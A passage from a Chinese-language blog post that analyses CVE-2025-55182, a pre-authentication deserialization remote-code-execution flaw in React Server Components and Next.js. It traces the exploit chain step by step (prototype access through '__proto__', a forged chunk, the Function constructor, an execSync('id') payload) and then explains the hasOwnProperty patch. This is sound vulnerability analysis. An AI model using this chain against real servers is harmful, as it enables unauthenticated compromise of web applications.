    <span class="k">if </span><span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">$</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">B</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>  <span class="c1">// "1337"</span>

        <span class="c1">// 调用 response._formData.get(response._prefix + id)</span>
        <span class="c1">// response = fakeChunk._response (伪造的！)</span>
        <span class="c1">// response._formData.get = Function</span>
        <span class="c1">// response._prefix = "throw new Error(...);"</span>

        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span> <span class="o">+</span> <span class="nx">id</span><span class="p">);</span>
        <span class="c1">// ↓ 等价于:</span>
        <span class="k">return</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">throw new Error(require('child_process').execSync('id').toString());1337</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-12-创建恶意函数"><span class="me-2">步骤 12: 创建恶意函数</span><a href="#步骤-12-创建恶意函数" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c1">// Function 构造函数被调用</span>
<span class="kd">const</span> <span class="nx">maliciousFunction</span> <span class="o">=</span> <span class="nc">Function</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">throw new Error(require('child_process').execSync('id').toString());1337</span><span class="dl">"</span>
<span class="p">);</span>

<span class="c1">// 这创建了一个函数:</span>
<span class="kd">function</span> <span class="nf">anonymous</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">).</span><span class="nf">toString</span><span class="p">());</span>
    <span class="mi">1337</span>  <span class="c1">// 这行语法正确但不会执行</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-13-函数被执行---rce"><span class="me-2">步骤 13: 函数被执行 - RCE！</span><a href="#步骤-13-函数被执行---rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">// parseModel 返回:</span>
<span class="kd">const</span> <span class="nx">innerResult</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">then</span><span class="p">:</span> <span class="nx">maliciousFunction</span>  <span class="c1">// 函数对象</span>
<span class="p">};</span>

<span class="c1">// innerResult 是 thenable（then 是函数）</span>
<span class="c1">// 当被 await 时:</span>
<span class="k">await</span> <span class="nx">innerResult</span><span class="p">;</span>

<span class="c1">// JavaScript 会调用:</span>
<span class="nx">innerResult</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>
<span class="c1">// 等价于:</span>
<span class="nf">maliciousFunction</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>

<span class="c1">// 函数执行！</span>
<span class="c1">// require('child_process').execSync('id') 在服务器上运行！</span>
<span class="c1">// 命令执行结果通过 throw Error 返回给攻击者</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="55-完整调用栈"><span class="me-2">5.5 完整调用栈</span><a href="#55-完整调用栈" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre></td><td class="rouge-code"><pre>HTTP POST /
    │
    ▼
handleAction()
    │
    ▼
decodeReplyFromBusboy()
    │
    ▼
getChunk(0) ─────────────────────────────────────────────┐
    │                                                     │
    ▼                                                     │
await chunk0 ← chunk0.then()                             │
    │                                                     │
    ▼                                                     │
ReactPromise.prototype.then()                            │
    │ status === "resolved_model"                        │
    ▼                                                     │
initializeModelChunk(chunk0)                             │
    │                                                     │
    ▼                                                     │
parseModel('{"then":"$1:__proto__:then",...}')          │
    │                                                     │
    ├──→ 解析 "$1:__proto__:then"                        │
    │      │                                              │
    │      ▼                                              │
    │    getChunk(1) → 解析 "$@0" → Chunk0 对象 ─────────┘
    │      │
    │      ▼
    │    Chunk0.__proto__ → ReactPromise.prototype
    │      │
    │      ▼
    │    ReactPromise.prototype.then ← 返回
    │
    ├──→ 解析 "$1:constructor:constructor"
    │      │
    │      ▼
    │    Chunk0.constructor.constructor → Function ← 返回
    │
    ▼
chunk0.value = fakeChunk（伪造对象）
    │
    ▼
await fakeChunk ← fakeChunk.then()
    │
    ▼
ReactPromise.prototype.then.call(fakeChunk)
    │ fakeChunk.status === "resolved_model"
    ▼
initializeModelChunk(fakeChunk)
    │ 使用伪造的 fakeChunk._response
    ▼
parseModel('{"then":"$B1337"}')
    │
    ├──→ 解析 "$B1337"
    │      │
    │      ▼
    │    response._formData.get(response._prefix + "1337")
    │      │
    │      ▼
    │    Function("恶意代码;1337")
    │      │
    │      ▼
    │    返回恶意函数
    │
    ▼
result = { then: maliciousFunction }
    │
    ▼
await result ← result.then()
    │
    ▼
maliciousFunction() 被调用
    │
    ▼
require('child_process').execSync('id') 执行
    │
    ▼
RCE 成功！命令在服务器执行！
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h2 id="六为什么是-pre-auth-漏洞"><span class="me-2">六、为什么是 Pre-auth 漏洞</span><a href="#六为什么是-pre-auth-漏洞" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="61-nextjs-server-action-处理流程"><span class="me-2">6.1 Next.js Server Action 处理流程</span><a href="#61-nextjs-server-action-处理流程" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│                    Next.js Server Action 处理流程                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  HTTP 请求进入                                                           │
│       │                                                                  │
│       ▼                                                                  │
│  ┌─────────────────┐                                                    │
│  │ 检查 Next-Action│ ← Header 存在即进入 Action 处理                    │
│  │ Header 是否存在 │                                                    │
│  └────────┬────────┘                                                    │
│           │                                                              │
│           ▼                                                              │
│  ┌─────────────────┐                                                    │
│  │ 反序列化请求体   │ ← ⚠️ 漏洞在此触发！                               │
│  │ (Flight Protocol)│                                                   │
│  └────────┬────────┘                                                    │
│           │                                                              │
│           ▼                                                              │
│  ┌─────────────────┐                                                    │
│  │ 验证 Action ID  │ ← 永远不会执行到                                   │
│  │ (40字符哈希)    │                                                    │
│  └────────┬────────┘                                                    │
│           │                                                              │
│           ▼                                                              │
│  ┌─────────────────┐                                                    │
│  │ 执行 Server     │ ← 永远不会执行到                                   │
│  │ Function        │                                                    │
│  └─────────────────┘                                                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h3 id="62-代码证明"><span class="me-2">6.2 代码证明</span><a href="#62-代码证明" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="c1">// next/dist/server/app-render/action-handler.js (简化)</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">handleAction</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">actionId</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">next-action</span><span class="dl">'</span><span class="p">];</span>

    <span class="c1">// 第一步: 解析 multipart 数据（如果是 multipart 请求）</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">contentType</span><span class="p">?.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">multipart/form-data</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">busboy</span> <span class="o">=</span> <span class="nc">Busboy</span><span class="p">({</span> <span class="na">headers</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span> <span class="p">});</span>

        <span class="c1">// 收集表单数据...</span>

        <span class="c1">// ⚠️ 关键: 这里调用 Flight 协议反序列化</span>
        <span class="c1">// 漏洞在这一步触发，RCE 在这里发生</span>
        <span class="kd">const</span> <span class="nx">boundActionArguments</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">decodeReplyFromBusboy</span><span class="p">(</span>
            <span class="nx">body</span><span class="p">,</span>
            <span class="nx">webNextRequest</span><span class="p">.</span><span class="nx">headers</span><span class="p">,</span>
            <span class="nx">temporaryReferences</span>
        <span class="p">);</span>

        <span class="c1">// 以下代码永远不会执行，因为上面已经 RCE 或抛出异常</span>
    <span class="p">}</span>

    <span class="c1">// 第二步: 验证 Action ID</span>
    <span class="kd">const</span> <span class="nx">action</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">getActionFromId</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ActionNotFoundError</span><span class="p">();</span>  <span class="c1">// 永远不会到达</span>
    <span class="p">}</span>

    <span class="c1">// 第三步: 执行 Action</span>
    <span class="k">return</span> <span class="k">await</span> <span class="nx">action</span><span class="p">.</span><span class="nf">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">boundActionArguments</span><span class="p">);</span>  <span class="c1">// 永远不会到达</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<hr />

<h2 id="七漏洞修复分析"><span class="me-2">七、漏洞修复分析</span><a href="#七漏洞修复分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="71-官方补丁"><span class="me-2">7.1 官方补丁</span><a href="#71-官方补丁" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>React 团队在多处添加了 <code class="language-plaintext highlighter-rouge">hasOwnProperty</code> 检查：</p>

<div class="language-diff highlighter-rouge"><div class="code-header">
        <span data-label-text="Diff"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>// packages/react-server-dom-webpack/src/ReactFlightServerReference.js
<span class="err">
</span><span class="p">function requireModule(metadata) {
</span>    var moduleExports = __webpack_require__(metadata[ID]);
<span class="err">
</span><span class="gd">-   return moduleExports[metadata[NAME]];
</span><span class="gi">+   if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
+       return moduleExports[metadata[NAME]];
+   }
+   return undefined;
</span>}
<span class="err">
</span>// 类似的修复应用于属性访问的其他位置
<span class="p">function getProperty(obj, key) {
</span><span class="gd">-   return obj[key];
</span><span class="gi">+   if (hasOwnProperty.call(obj, key)) {
+       return obj[key];
+   }
+   return undefined;
</span>}
</pre></td></tr></tbody></table></code></div></div>

<h3 id="72-修复原理"><span class="me-2">7.2 修复原理</span><a href="#72-修复原理" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span> <span class="p">};</span>

<span class="c1">// 修复前（存在漏洞）:</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">]</span>                    <span class="c1">// → Object.prototype ← 可访问！</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">]</span>                  <span class="c1">// → Object ← 可访问！</span>

<span class="c1">// 修复后:</span>
<span class="k">if </span><span class="p">(</span><span class="nx">hasOwnProperty</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">];</span>
<span class="p">}</span>
<span class="c1">// hasOwnProperty 返回 false，不会访问原型链</span>
<span class="c1">// 返回 undefined，攻击链断裂</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="73-为什么-hasownproperty-可以防御"><span class="me-2">7.3 为什么 hasOwnProperty 可以防御</span><a href="#73-为什么-hasownproperty-可以防御" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>属性</th>
      <th>obj[key]</th>
      <th>hasOwnProperty.call(obj, key)</th>
      <th>来源</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">name</code></td>
      <td><code class="language-plaintext highlighter-rouge">"test"</code></td>
      <td><code class="language-plaintext highlighter-rouge">true</code></td>
      <td>自身属性</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">__proto__</code></td>
      <td><code class="language-plaintext highlighter-rouge">Object.prototype</code></td>
      <td><code class="language-plaintext highlighter-rouge">false</code></td>
      <td>继承</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">constructor</code></td>
      <td><code class="language-plaintext highlighter-rouge">Object</code></td>
      <td><code class="language-plaintext highlighter-rouge">false</code></td>
      <td>继承</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">toString</code></td>
      <td><code class="language-plaintext highlighter-rouge">[Function]</code></td>
      <td><code class="language-plaintext highlighter-rouge">false</code></td>
      <td>继承</td>
    </tr>
  </tbody>
</table></div>

<p><code class="language-plaintext highlighter-rouge">hasOwnProperty</code> 只返回 <code class="language-plaintext highlighter-rouge">true</code> 对于对象<strong>自身</strong>定义的属性，不包括从原型链继承的属性。</p>

<hr />

<h2 id="八总结"><span class="me-2">八、总结</span><a href="#八总结" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="81-漏洞概述"><span class="me-2">8.1 漏洞概述</span><a href="#81-漏洞概述" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>CVE-2025-55182 是一个影响 React Server Components 和 Next.js 的严重远程代码执行漏洞。</p>

<h3 id="82-关键技术点"><span class="me-2">8.2 关键技术点</span><a href="#82-关键技术点" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>方面</th>
      <th>详情</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>根本原因</strong></td>
      <td>Flight 协议解析属性时缺少 <code class="language-plaintext highlighter-rouge">hasOwnProperty</code> 检查</td>
    </tr>
    <tr>
      <td><strong>利用方式</strong></td>
      <td>通过 <code class="language-plaintext highlighter-rouge">__proto__</code> 访问原型链，获取 <code class="language-plaintext highlighter-rouge">Function</code> 构造函数</td>
    </tr>
    <tr>
      <td><strong>触发点</strong></td>
      <td><code class="language-plaintext highlighter-rouge">$@</code> 前缀获取原始 Chunk 对象 + <code class="language-plaintext highlighter-rouge">$B</code> 前缀触发函数调用</td>
    </tr>
    <tr>
      <td><strong>Pre-auth</strong></td>
      <td>漏洞在验证 Action ID 之前触发</td>
    </tr>
  </tbody>
</table></div>

<h3 id="83-利用链总结"><span class="me-2">8.3 利用链总结</span><a href="#83-利用链总结" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>原型链访问 → 获取 Chunk.prototype.then → 构造伪造 Chunk
    → 获取 Function 构造函数 → $B 触发 Function 调用
    → thenable 模式执行函数 → RCE
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h2 id="九参考资料"><span class="me-2">九、参考资料</span><a href="#九参考资料" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>React Security Advisory: https://github.com/facebook/react/security/advisories</li>
  <li>Next.js Security Advisory: https://github.com/vercel/next.js/security/advisories</li>
  <li>React Flight Protocol: https://github.com/facebook/react/tree/main/packages/react-server</li>
  <li>Server Actions Documentation: https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations</li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/vulnerability/">vulnerability</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/cve/"
            class="post-tag no-text-decoration"
          >CVE</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=CVE-2025-55182%20React%20Server%20Components%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90%20-%20imjdl%20blog&url=%2Fposts%2FCVE-2025-55182%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=CVE-2025-55182%20React%20Server%20Components%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90%20-%20imjdl%20blog&u=%2Fposts%2FCVE-2025-55182%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2FCVE-2025-55182%2F&text=CVE-2025-55182%20React%20Server%20Components%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2025-55182/">CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/pa/">From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/version/">Practicing Version Recognition Technology in Critical Devices</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/mcp/">Security Challenges in the Popularization of MCP Services</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/simple-help/">Vulnerability Review:CVE-2024-57727 Simple Help Unauthenticated Path Traversal Vulnerability</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fortigate/">Fortigate</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mcp/">MCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/palo-alto-networks-pan-os/">Palo-Alto-Networks-PAN-OS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/simplehelp/">SimpleHelp</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/ivanti-csa/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1730866380"
  data-df="ll"
  
>
  Nov  6, 2024
</time>

              <h4 class="pt-0 my-2">Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</h4>
              <div class="text-muted">
                <p>Overview

Ivanti CSA is a unified endpoint management platform that provides a comprehensive suite of tools for managing and securing
devices, applications, and data across an organization’s networ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/showdoc-sql-injection-and-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1717301580"
  data-df="ll"
  
>
  Jun  2, 2024
</time>

              <h4 class="pt-0 my-2">ShowDoc Sql Injection and Remote Code Execution</h4>
              <div class="text-muted">
                <p>Overview

ShowDoc is a versatile online documentation tool tailored for IT teams, perfect for creating beautiful API documents,
tech manuals, and more using markdown. Its features include automated...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/zentao-auth-bypass/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1714104780"
  data-df="ll"
  
>
  Apr 26, 2024
</time>

              <h4 class="pt-0 my-2">Zentao Authentication Bypass</h4>
              <div class="text-muted">
                <p>Overview
ZenTao is a widely used open-source project management software that offers functionalities like project management,
product management, test management, document management, bug managemen...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/pa/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
